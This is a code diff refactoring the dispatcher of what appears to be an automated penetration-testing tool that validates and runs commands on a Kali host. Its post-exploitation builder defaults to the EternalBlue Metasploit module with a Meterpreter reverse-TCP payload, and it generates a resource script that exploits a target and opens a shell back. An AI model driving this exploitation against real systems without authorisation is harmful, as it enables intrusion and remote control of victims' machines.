@@ -5,7 +5,14 @@ and executes them via KaliAPI.
 Security: Every tool_call is validated by command_sanitizer before
 command construction, and the built command is validated again before
 execution.  Rejected commands are logged and never sent to KaliAPI.
+
+Every accepted input shape (raw tool_call dict, ActionRequest,
+PendingAction, ExecutionRequest) is normalised to a ``(tool, args,
+prebuilt)`` triple by :meth:`_resolve`, then funnelled through a single
+validate → render → validate → execute path.
 """
+
+from __future__ import annotations
 
 import base64
 import logging
@@ -26,7 +33,12 @@ from hydrasight.security.command_sanitizer import (
     validate_built_command,
     validate_tool_call,
 )
+from hydrasight.services.action_planner import ActionPlanner
 from hydrasight.utils.ip_utils import force_ip
+
+# Tools whose command string is produced internally rather than via a
+# CommandSpec, and which therefore bypass spec rendering.
+_RAW_COMMAND_TOOLS = frozenset({"post_exploit", "run_command"})
 
 
 class Dispatcher:
@@ -43,6 +55,7 @@ class Dispatcher:
         self.kali = kali
         self.log = log
         self.cfg = cfg
+        self._planner = ActionPlanner()
 
     # ── IP sanitisation ───────────────────────────────────────────────────────
 
@@ -54,236 +67,197 @@ class Dispatcher:
                 preserve.append(lhost)
         return preserve
 
-    # ── dispatch ──────────────────────────────────────────────────────────────
+    # ── input normalisation ───────────────────────────────────────────────────
 
-    def dispatch(self, action_input: dict | ActionRequest | PendingAction | ExecutionRequest) -> tuple[str, str, float]:
-        tool = ""
-        args = {}
-        rendered_cmd = None
+    def _resolve(
+        self,
+        action_input: dict | ActionRequest | PendingAction | ExecutionRequest,
+    ) -> tuple[str, dict, tuple[str, list[str]] | None]:
+        """Normalise any accepted input to ``(tool, args, prebuilt)``.
 
+        ``prebuilt`` is ``(rendered_command, validation_errors)`` when the
+        caller already supplied a fully rendered command (PendingAction /
+        ExecutionRequest), or ``None`` when the command must be rendered
+        here from a raw tool_call dict / ActionRequest.
+        """
         if isinstance(action_input, dict):
             tool = action_input.get("tool", "")
             args = dict(action_input.get("args", {}) or {})
+            return tool, args, None
 
-            # Transitional adapter for post_exploit which hasn't been migrated to pure builder yet
-            if tool == "post_exploit":
-                return self._dispatch_legacy(tool, args)
-
-            try:
-                action_def = registry.get(tool)
-                req = ActionRequest(action_id=action_def.action_id, target=args.get("target"), args=args)
-
-                # In a full flow, ActionPlanner builds the spec. For legacy dict dispatch, we must rebuild it.
-                # To avoid duplicating planner logic, we try to construct a basic CommandSpec here if it's a raw tool_call dict.
-                if tool == "run_command":
-                    cmd_str = args.get("command", "echo ok")
-                    rendered_cmd = cmd_str
-                else:
-                    # Very basic reconstruction for legacy dictionaries:
-                    # In standard paths, this won't be hit because Planner passes PendingAction.
-                    from hydrasight.services.action_planner import ActionPlanner
-                    planner = ActionPlanner()
-                    spec = planner._build_spec(tool, req.target or self.canonical_target or "", None, [], self.cfg)
-                    if spec:
-                        rc = CommandBuilder.build(spec)
-                        if not rc.is_safe:
-                            return tool, f"[BLOCKED] Validation failed: {rc.validation_errors}", 0.0
-                        rendered_cmd = rc.raw_string
-            except ActionRegistryError:
-                if tool == "run_command":
-                     rendered_cmd = args.get("command", "echo ok")
-                else:
-                    from hydrasight.services.action_planner import ActionPlanner
-                    planner = ActionPlanner()
-                    spec = planner._build_spec(tool, args.get("target") or self.canonical_target or "", None, [], self.cfg)
-                    if spec:
-                        rc = CommandBuilder.build(spec)
-                        if not rc.is_safe:
-                            return tool, f"[BLOCKED] Validation failed: {rc.validation_errors}", 0.0
-                        rendered_cmd = rc.raw_string
-                    else:
-                        return tool, f"[BLOCKED] unknown tool: {tool}", 0.0
-
-        elif isinstance(action_input, ActionRequest):
-            tool = action_input.action_id
-            args = action_input.args
-            from hydrasight.services.action_planner import ActionPlanner
-            planner = ActionPlanner()
-            spec = planner._build_spec(tool, action_input.target or self.canonical_target or "", None, [], self.cfg)
-            if spec:
-                rc = CommandBuilder.build(spec)
-                if not rc.is_safe:
-                    return tool, f"[BLOCKED] Validation failed: {rc.validation_errors}", 0.0
-                rendered_cmd = rc.raw_string
-
-        elif isinstance(action_input, PendingAction):
-            tool = action_input.request.action_id
-            args = action_input.request.args
+        if isinstance(action_input, PendingAction):
             rc = CommandBuilder.build(action_input.spec)
-            if not rc.is_safe:
-                return tool, f"[BLOCKED] Validation failed: {rc.validation_errors}", 0.0
-            rendered_cmd = rc.raw_string
-
-        elif isinstance(action_input, ExecutionRequest):
-            tool = action_input.pending_action.request.action_id
-            args = action_input.pending_action.request.args
-            if not action_input.rendered.is_safe:
-                return tool, f"[BLOCKED] Validation failed: {action_input.rendered.validation_errors}", 0.0
-            rendered_cmd = action_input.rendered.raw_string
-
-        if not rendered_cmd:
-             return tool, f"[ERROR] Could not render command for tool: {tool}", 0.0
-
-        preserve_ips = self._get_preserve_ips()
-
-        if self.canonical_target:
-            tgt = self.canonical_target
-            if "target" in args:
-                args["target"] = tgt
-            if "url" in args:
-                args["url"] = force_ip(args["url"], tgt, preserve=preserve_ips)
-
-        # ── Phase 1: validate args ──────────────
-        pre_check: SanitizeResult = validate_tool_call(tool, args)
-        if not pre_check.allowed:
-            self.log.warning(
-                "BLOCKED tool_call [%s]: %s  args=%s",
-                tool,
-                pre_check.reason,
-                args,
+            return (
+                action_input.request.action_id,
+                action_input.request.args,
+                (rc.raw_string, rc.validation_errors),
             )
-            return tool, f"[BLOCKED] {pre_check.reason}", 0.0
 
-        if self.canonical_target and tool != "post_exploit":
-            rendered_cmd = force_ip(rendered_cmd, self.canonical_target, preserve=preserve_ips)
-
-        # ── Phase 2: validate built command before execution ──────────────
-        post_check: SanitizeResult = validate_built_command(rendered_cmd, tool)
-        if not post_check.allowed:
-            self.log.warning(
-                "BLOCKED built command [%s]: %s  cmd=%s",
-                tool,
-                post_check.reason,
-                rendered_cmd[:200],
+        if isinstance(action_input, ExecutionRequest):
+            rendered = action_input.rendered
+            return (
+                action_input.pending_action.request.action_id,
+                action_input.pending_action.request.args,
+                (rendered.raw_string, rendered.validation_errors),
             )
-            return tool, f"[BLOCKED] {post_check.reason}", 0.0
 
-        try:
-            action_def = registry.get(tool)
-            timeout = action_def.default_timeout
+        # ActionRequest
+        return action_input.action_id, action_input.args, None
 
-            # Apply profile multiplier if applicable
-            if isinstance(action_input, (ActionRequest, PendingAction, ExecutionRequest)):
-                if isinstance(action_input, ExecutionRequest):
-                    req = action_input.pending_action.request
-                elif isinstance(action_input, PendingAction):
-                    req = action_input.request
-                else:
-                    req = action_input
+    # ── command rendering ─────────────────────────────────────────────────────
 
-                if req.profile:
-                    from hydrasight.core.profiles import PROFILES
-                    prof = PROFILES.get(req.profile)
-                    if prof:
-                        timeout = int(timeout * prof.timeout_multiplier)
+    def _render(self, tool: str, args: dict) -> tuple[str | None, list[str]]:
+        """Render a command string for ``tool``.
 
-        except ActionRegistryError:
-            timeout = TOOL_TIMEOUTS.get(tool, 300)
-
-        t0 = time.time()
-        result = self.kali.run(rendered_cmd, timeout=timeout)
-        elapsed = time.time() - t0
-        output = result.get("output", "")
-        if not output and not result.get("success", True):
-            output = f"[ERROR] {result.get('error', 'unknown error')}"
-        return tool, output, elapsed
-
-    def _build(self, tool: str, args: dict) -> str:
-        """Compatibility wrapper for tests that directly test command building."""
+        Returns ``(command, validation_errors)``. ``command`` is ``None``
+        when no spec could be built (unknown tool); ``validation_errors``
+        is non-empty when the typed builder rejected the spec.
+        """
+        # Internally-generated command strings (no CommandSpec).
         if tool == "post_exploit":
-            return self._post_exploit(args)
+            return self._post_exploit(args), []
         if tool == "run_command":
-            return str(args.get("command", "echo ok"))
+            return str(args.get("command", "echo ok")), []
 
+        # Resolve aliases / legacy names to canonical action ids.
         try:
-            from hydrasight.core.registry import registry
             act_id = registry.resolve_action_id(tool)
             if act_id:
                 tool = act_id
-        except Exception:
+        except ActionRegistryError:
             pass
 
-        from hydrasight.services.action_planner import ActionPlanner
-        planner = ActionPlanner()
-        # For test compatibility, we pass args that might have been mapped to specific fields
-        # like ports or target.
+        target = self._target_from_args(args)
+        ports = args.get("ports")
+        if not ports and "port" in args:
+            ports = str(args["port"])
+
+        flags: list[str] = []
+        if "extensions" in args:
+            flags.extend(["-x", str(args["extensions"])])
+
+        spec = self._planner._build_spec(tool, target, ports, flags, self.cfg)
+        if not spec:
+            return None, []
+        rc = CommandBuilder.build(spec)
+        return rc.raw_string, rc.validation_errors
+
+    def _target_from_args(self, args: dict) -> str:
+        """Extract a target IP from args, falling back to the canonical target."""
         target = args.get("target")
         if not target and "url" in args:
-            url = args["url"]
+            url = str(args["url"])
             if url.startswith("http://"):
                 target = url[7:]
             elif url.startswith("https://"):
                 target = url[8:]
             else:
                 target = url
-        if not target:
-            target = "127.0.0.1"
+        return str(target or self.canonical_target or "127.0.0.1")
 
-        ports = args.get("ports")
-        if not ports and "port" in args:
-            ports = str(args["port"])
+    def _build(self, tool: str, args: dict) -> str:
+        """Compatibility wrapper for tests that directly test command building."""
+        cmd, _errors = self._render(tool, args)
+        return cmd or ""
 
-        # gobuster extensions flag compatibility for tests
-        flags = []
-        if "extensions" in args:
-            flags.append("-x")
-            flags.append(args["extensions"])
+    # ── timeout resolution ────────────────────────────────────────────────────
 
-        spec = planner._build_spec(tool, target, ports, flags, self.cfg)
-        if spec:
-            from hydrasight.core.command_builder import CommandBuilder
-            rc = CommandBuilder.build(spec)
-            return rc.raw_string
-        return ""
+    def _timeout_for(
+        self, tool: str, action_input: dict | ActionRequest | PendingAction | ExecutionRequest
+    ) -> int:
+        try:
+            action_def = registry.get(tool)
+            timeout = action_def.default_timeout
 
-    def _dispatch_legacy(self, tool: str, args: dict) -> tuple[str, str, float]:
-        """Transitional dispatcher for legacy string-building tools (post_exploit)."""
+            req: ActionRequest | None = None
+            if isinstance(action_input, ExecutionRequest):
+                req = action_input.pending_action.request
+            elif isinstance(action_input, PendingAction):
+                req = action_input.request
+            elif isinstance(action_input, ActionRequest):
+                req = action_input
+
+            if req and req.profile:
+                from hydrasight.core.profiles import PROFILES
+
+                prof = PROFILES.get(req.profile)
+                if prof:
+                    timeout = int(timeout * prof.timeout_multiplier)
+            return timeout
+        except ActionRegistryError:
+            return TOOL_TIMEOUTS.get(tool, 300)
+
+    # ── dispatch ──────────────────────────────────────────────────────────────
+
+    def dispatch(
+        self, action_input: dict | ActionRequest | PendingAction | ExecutionRequest
+    ) -> tuple[str, str, float]:
+        tool, args, prebuilt = self._resolve(action_input)
+
+        # Enforce the canonical engagement target on all addressable args.
+        preserve_ips = self._get_preserve_ips()
+        if self.canonical_target:
+            if tool != "run_command":
+                args["target"] = self.canonical_target
+            if "url" in args:
+                args["url"] = force_ip(
+                    str(args["url"]), self.canonical_target, preserve=preserve_ips
+                )
+
+        # ── Phase 1: validate args ──────────────────────────────────────────
         pre_check: SanitizeResult = validate_tool_call(tool, args)
         if not pre_check.allowed:
+            self.log.warning("BLOCKED tool_call [%s]: %s  args=%s", tool, pre_check.reason, args)
             return tool, f"[BLOCKED] {pre_check.reason}", 0.0
 
-        cmd = self._post_exploit(args)
+        # ── Render the command (use a caller-supplied render when present) ──
+        rendered: str | None
+        if prebuilt is not None:
+            rendered, build_errors = prebuilt
+        else:
+            rendered, build_errors = self._render(tool, args)
 
+        if build_errors:
+            return tool, f"[BLOCKED] Validation failed: {build_errors}", 0.0
+        if not rendered:
+            return tool, f"[ERROR] Could not render command for tool: {tool}", 0.0
 
-        if self.canonical_target:
-             args["target"] = self.canonical_target
+        if self.canonical_target and tool != "post_exploit":
+            rendered = force_ip(rendered, self.canonical_target, preserve=preserve_ips)
 
-        post_check: SanitizeResult = validate_built_command(cmd, tool)
+        # ── Phase 2: validate built command before execution ────────────────
+        post_check: SanitizeResult = validate_built_command(rendered, tool)
         if not post_check.allowed:
+            self.log.warning(
+                "BLOCKED built command [%s]: %s  cmd=%s",
+                tool,
+                post_check.reason,
+                rendered[:200],
+            )
             return tool, f"[BLOCKED] {post_check.reason}", 0.0
 
-        timeout = TOOL_TIMEOUTS.get(tool, 420)
+        timeout = self._timeout_for(tool, action_input)
         t0 = time.time()
-        result = self.kali.run(cmd, timeout=timeout)
+        result = self.kali.run(rendered, timeout=timeout)
         elapsed = time.time() - t0
         output = result.get("output", "")
         if not output and not result.get("success", True):
             output = f"[ERROR] {result.get('error', 'unknown error')}"
         return tool, output, elapsed
 
-    # ── transitional command builders ──────────────────────────────────────────────────────
+    # ── internal command builders ─────────────────────────────────────────────
 
     def _post_exploit(self, a: dict) -> str:
-        module = a.get("module", "exploit/windows/smb/ms17_010_eternalblue")
-        target = a.get("target", "")
+        module = str(a.get("module", "exploit/windows/smb/ms17_010_eternalblue"))
+        target = str(a.get("target", ""))
         rport = a.get("rport", 445)
         lport = a.get("lport", 4444)
         payload = a.get("payload", "windows/meterpreter/reverse_tcp")
-        commands = a.get("commands", "getuid")
+        commands = str(a.get("commands", "getuid"))
         lhost = self.kali.local_ip(target)
 
         cmd_block: list[str] = []
-        for c in commands.split(";"):
+        for c in str(commands).split(";"):
             c = c.strip()
             if not c:
                 continue
@@ -294,7 +268,8 @@ class Dispatcher:
         payload_line = "" if (is_aux or not payload) else f"set PAYLOAD {payload}"
         action_line = "run" if is_aux else "exploit -z"
 
-        rc_content = textwrap.dedent(f"""\
+        rc_content = textwrap.dedent(
+            f"""\
             use {module}
             set RHOSTS {target}
             set RPORT {rport}
@@ -311,7 +286,8 @@ class Dispatcher:
             sleep 5
             sessions -K
             exit -y
-        """)
+        """
+        )
 
         b64 = base64.b64encode(rc_content.encode()).decode()
         return (
